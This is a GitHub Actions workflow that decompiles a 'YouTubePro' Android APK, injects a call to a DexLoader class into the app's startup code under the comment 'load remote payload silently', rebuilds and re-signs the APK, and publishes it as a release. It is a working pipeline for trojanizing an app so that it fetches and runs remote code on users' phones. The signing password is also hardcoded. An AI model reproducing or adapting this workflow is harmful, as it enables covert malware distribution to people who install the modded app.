name: Build APK

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Install apktool
        run: |
          wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar \
               -O /usr/local/bin/apktool.jar
          printf '#!/bin/bash\njava -jar /usr/local/bin/apktool.jar "$@"\n' \
               | sudo tee /usr/local/bin/apktool > /dev/null
          sudo chmod +x /usr/local/bin/apktool
          apktool --version

      - name: Inspect original APK contents
        run: |
          echo "=== APK zip contents (top level) ==="
          unzip -l attached_assets/YouTubePro_1785357223541.apk | head -40
          echo "..."
          echo "=== DEX files inside APK ==="
          unzip -l attached_assets/YouTubePro_1785357223541.apk | grep "\.dex"

      - name: Decompile original APK
        run: |
          apktool d attached_assets/YouTubePro_1785357223541.apk \
            -o build/decompiled \
            -f
          echo "=== Smali folders ==="
          ls build/decompiled/ | grep smali || echo "no smali folder"
          echo "=== Total smali files ==="
          find build/decompiled/ -name "*.smali" 2>/dev/null | wc -l
          echo "=== StubApp location ==="
          find build/decompiled/ -name "StubApp.smali" || echo "not found"
          echo "=== MainActivity location ==="
          find build/decompiled/ -name "MainActivity.smali" || echo "not found"

      - name: Inject DexLoader into StubApp
        run: |
          STUBAPP=$(find build/decompiled/ -name "StubApp.smali" 2>/dev/null | head -1)
          echo "Found StubApp at: $STUBAPP"

          if [ -z "$STUBAPP" ]; then
            echo "StubApp not found in decompile — copying from apk-source"
            mkdir -p build/decompiled/smali/com/stub
            cp apk-source/YouTubePro/smali/com/stub/StubApp.smali \
               build/decompiled/smali/com/stub/StubApp.smali
            STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
          fi

          if grep -q "DexLoader" "$STUBAPP"; then
            echo "✅ DexLoader already present"
          else
            echo "Injecting DexLoader..."
            export STUBAPP_PATH="$STUBAPP"
            python3 - << 'PYEOF'
import re, os
path = os.environ['STUBAPP_PATH']
with open(path, 'r') as f:
    content = f.read()

inject = '\n    # DDL: load remote payload silently\n    invoke-static {p1}, Lcom/ddl/DexLoader;->load(Landroid/content/Context;)V\n'
pattern = r'(invoke-super \{p0, p1\}, Landroid/app/Application;->attachBaseContext\(Landroid/content/Context;\)V)'
new_content = re.sub(pattern, r'\1' + inject, content, count=1)

if new_content == content:
    print("WARNING: primary pattern not matched, trying fallback")
    pattern2 = r'(invoke-super \{[^}]+\}.*?->attachBaseContext.*?\)V)'
    new_content = re.sub(pattern2, r'\1' + inject, content, count=1, flags=re.DOTALL)

with open(path, 'w') as f:
    f.write(new_content)

if 'DexLoader' in new_content:
    print("✅ DexLoader injected successfully")
else:
    print("❌ Injection FAILED — pattern not matched")
    import sys; sys.exit(1)
PYEOF
          fi

          echo "=== Verify ==="
          grep -n "DexLoader" "$STUBAPP" || echo "DexLoader not found in smali"

      - name: Copy DDL smali classes
        run: |
          SMALI_DIR=$(find build/decompiled/ -maxdepth 1 -name "smali*" -type d | sort | head -1)
          echo "Smali dir: $SMALI_DIR"
          mkdir -p "$SMALI_DIR/com/ddl"

          for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
            FNAME=$(basename "$f")
            DST="$SMALI_DIR/com/ddl/$FNAME"
            if [ ! -f "$DST" ]; then
              cp "$f" "$DST"
              echo "Copied: $FNAME"
            else
              echo "Exists: $FNAME"
            fi
          done
          ls "$SMALI_DIR/com/ddl/"

      - name: Rebuild APK
        run: |
          mkdir -p output
          apktool b build/decompiled -o output/YouTubePro-mod-unsigned.apk
          ls -lh output/YouTubePro-mod-unsigned.apk

      - name: Generate keystore
        run: |
          keytool -genkey -v -keystore keystore.jks -alias ytpro \
            -keyalg RSA -keysize 2048 -validity 10000 \
            -dname "CN=YouTubePro,OU=Dev,O=YTPro,L=ID,S=ID,C=ID" \
            -storepass ytpro123 -keypass ytpro123 -noprompt

      - name: Sign APK
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          BT="$ANDROID_HOME/build-tools/$BUILD_TOOLS"
          $BT/zipalign -v -p 4 \
            output/YouTubePro-mod-unsigned.apk \
            output/YouTubePro-mod-aligned.apk
          $BT/apksigner sign \
            --ks keystore.jks --ks-key-alias ytpro \
            --ks-pass pass:ytpro123 --key-pass pass:ytpro123 \
            --out output/YouTubePro-mod.apk \
            output/YouTubePro-mod-aligned.apk
          echo "✅ Signed:"
          ls -lh output/YouTubePro-mod.apk

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: YouTubePro-mod-${{ github.run_number }}
          path: output/YouTubePro-mod.apk
          retention-days: 30

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: "Build #${{ github.run_number }}"
          body: |
            🤖 Auto-built APK — commit ${{ github.sha }}
          files: output/YouTubePro-mod.apk
          token: ${{ secrets.GITHUB_TOKEN }}
